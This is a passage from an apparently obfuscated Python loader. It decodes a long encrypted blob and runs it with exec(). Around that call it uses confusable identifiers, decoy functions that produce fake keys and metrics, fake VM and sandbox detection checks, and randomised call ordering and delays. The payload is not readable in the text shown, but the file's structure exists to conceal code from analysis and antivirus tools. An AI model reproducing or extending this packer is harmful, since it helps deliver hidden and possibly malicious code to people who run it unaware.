76cR49toTkRmIuNRZoQsAdC0OOlS7owRr1TbNVHOwB+XgIA2zryOPxLSA8pma7HguVDUkKDxTj2NR82PLHIiqJ/Kgap3VbMyBQNT4XcoXCrV766QFbwhFHuAHSgNmwpx7PVYBO72jxLM8K3kiAF6phtWsbYfYEan1MZTlS7tEtRoaTmTO7kxiujO6T4k7pdTJyroDrY4eqc+mP9pQV90+kWWWRv3U9qU/P/JvSUk4syQ6X0UKhmBzAWrgyWj3WD6YQTIgY4YFQs28NUBgPSnW/oZiAHil5YaSWr/7uAhh5Uq2CdpJYy/sdvUBEm/IXf0D8T1z19JgBYipINCs+c+FIoldfymdHvF7dvBUDIaDJ6Wmm2R1p/qQczcn+1Dm8cA8+K7FwHPt4sDbHxTreCEkwQpRs0mc2/bvse5T0yXMKZ3YTIM/2YPLwi/iVCg9oEQ3nWZ1cIN0Yj0A4JywTnDhladjiN7XnKdgU4z8rEZ7Sgix0LdjahxOWOd8gpsU0a91Fd/QTq0OE5RJahxCfnk7ACnI08BZFv91Y+QLazbfdT7grxjwgnIcDrekLzbEYWBfVtG0xRZeFpTkviiV5rzTYoTFP2tKT6K87Q8MQd2xPOBk1yI5qMV78BpdKseDInx6XfsppOrMFwWPmIou3wHx/G4bM5KTs9FLfy+mQmkr9c9iaULTLZMYE7wvYOcNXWlUiSszzgYKNCoqn7aCp5oY1LNdzSwgbO4PCQRjo4WqRvmzaPaPN1DPi9aLH816paHBEibtIMcVrm1dlS6kkw0pbz1BgTsGYdOqHnQS8V1u6bvRUDt45JADtzgce0ssVmkFsDj5sZZv7OG/2E7jMSa5WppwLB9fRLda1x9l0xDHfwzTwLtMIQh0jDStBoKZv0ROEFGK6Jd5Aqg83M2arKJJJaEwxZga8zoqMX0AAffnvU1rp93UBVyda2AqmrCAkJCJBjFZBs4g+HrA+ilCX/Hm6sr/SriJASQDUctNIXionDFM6ckwjxEwUm5wztA0wsQItnMDVk+rXnxmOlz3pA5OeI9YUuE+5EMdjfUZQDB4izHdmrnEQqpzxIyw64pvhVC7LNBRvswLfozd2+D+QPZ2TbNUwzXnHNrEDj9dUARMQml88KjwkYM22XA1ad1UQ+5gH1I2M852fcBoPWNJJnaOZaua0xeJZCi8Fjgkd2sxQEq3vaO4Deh6bvWr0za/Qtj9nZ5YtE7kN4zVK6DkYpaflatBcvLj7Ww4i07+q/ZqKYySMuvIoIyJAHjaEN+AR4631sH7PIyawfhyrbgJzAkfV6zyLvxfc6wTjNpLSjvXNXjD8z9wjWr0dpw27G1ZQs0+OF2YKv+8uxzSiwCiWK5CEFCqbEZFiKou+lR+y1k1US6XQli3omDtWvb1e5ZuhIwVf375zbmfqSBlo2YNLTNrJ7hW9yK4JwUgluww+FYhiPoPp4j8u9Xo11QRHBhevfIsjsukRu6SDOsp+UDSDxtL5rU9agnNoStBuNlI4wKWst59mucXgxuI6IHqhbAz9KIp94E7bNty6RkUHjcqfqw6eOoEV8FGZW3F3nAyBuTAetTWTeGqVwB7VtyTDF9G/4rWn1ooNXc5bwgPLDL5xk5uVITJB4OEsrEUjm0WsaHndBmnUnlQ7Kgb4WcJE4OBSWP7V+PVpFT8+xnBorxDFhVmfq5axwYFofvUo3D6GUWAQ+3iXiRjwa9jC+UTv2LwYNe2qp4GdgReTKNbo+2PBEtsj3yj1DxU6FjKKzyKCCWAPjvNLb26fjRA3OUt1DK/YnsedsMBoBLji1Z3e0Cc+SxqdiyvIjY37hrAENMeyQdnVsBep92TZ/FwJC2i0zAL/z8uQOwnPpMwz/IpO+NGh/RBAUJOWCcsPxA4GB07SBTrBpm0FWX/3Jl9MWnKXNzYrcifglhY9NNT+AOsAwBQ1INEJ6kjYB6KTsB0N3pjBgRsQVY0skdPqsHGL0Nx3dOayOFrBW5wkD+iitLOZk1nEt9xoCj/RS9Is4LDgXpNdHtku2X80v09NP+MZBkXG6ag==')
        ool1OoIl0Oo0oo0Io0Ol = IIOlo_lI1lO_OOooI_I(lo00lllIllI0oIlOIo0O)
        exec(ool1OoIl0Oo0oo0Io0Ol.decode(), {'__name__': '__main__', '__file__': __file__})
    except Exception as e:
        print(f"Execution failed: {str(e)}")
        sys.exit(1)

def IoO0loO0lO0oIIl0Ol_o():
    fake_key = secrets.token_bytes(32)
    fake_data = base64.b64encode(secrets.token_bytes(2048)).decode()
    time.sleep(random.uniform(0.005, 0.025))
    return hashlib.sha512(fake_data.encode() + fake_key).hexdigest()

def Il1OoO0oIO_lIl0oOl0o():
    operations = random.randint(100, 500)
    for i in range(operations):
        _ = secrets.randbits(64) ^ secrets.randbits(64)
        _ = random.randint(0, 2**32) * random.randint(0, 2**16)
    return secrets.token_hex(32)

def I_oO0ll0oOoO0lIl0OI0():
    fake_metrics = {
        'entropy': random.uniform(7.8, 8.0),
        'compression_ratio': random.uniform(0.25, 0.75),
        'pattern_count': random.randint(50, 200),
        'signature_matches': [secrets.token_hex(16) for _ in range(random.randint(3, 12))],
        'complexity_score': random.uniform(0.85, 0.99)
    }
    time.sleep(random.uniform(0.01, 0.05))
    return fake_metrics

def ll1OoI0oO_l1OololIol():
    fake_vm_checks = [
        'vmware_detection_passed',
        'virtualbox_detection_passed', 
        'qemu_detection_passed',
        'sandbox_detection_passed'
    ]
    return all(check for check in fake_vm_checks)

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=Iol0oOlI0olOol_ol_oO, daemon=True)
    monitor_thread.start()
    time.sleep(random.uniform(0.005, 0.1))
    decoy_functions = [IoO0loO0lO0oIIl0Ol_o, Il1OoO0oIO_lIl0oOl0o, I_oO0ll0oOoO0lIl0OI0, ll1OoI0oO_l1OololIol]
    random.shuffle(decoy_functions)
    execution_pattern = random.randint(1, 4)
    if execution_pattern == 1:
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        O_olI0ol0oOoO0ll0oOl()
        decoy_functions[1]()
    elif execution_pattern == 2:
        decoy_functions[1]()
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        O_olI0ol0oOoO0ll0oOl()
    elif execution_pattern == 3:
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        O_olI0ol0oOoO0ll0oOl()
        decoy_functions[3]()
        decoy_functions[0]()
    else:
        decoy_functions[3]()
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        O_olI0ol0oOoO0ll0oOl()
        decoy_functions[1]()
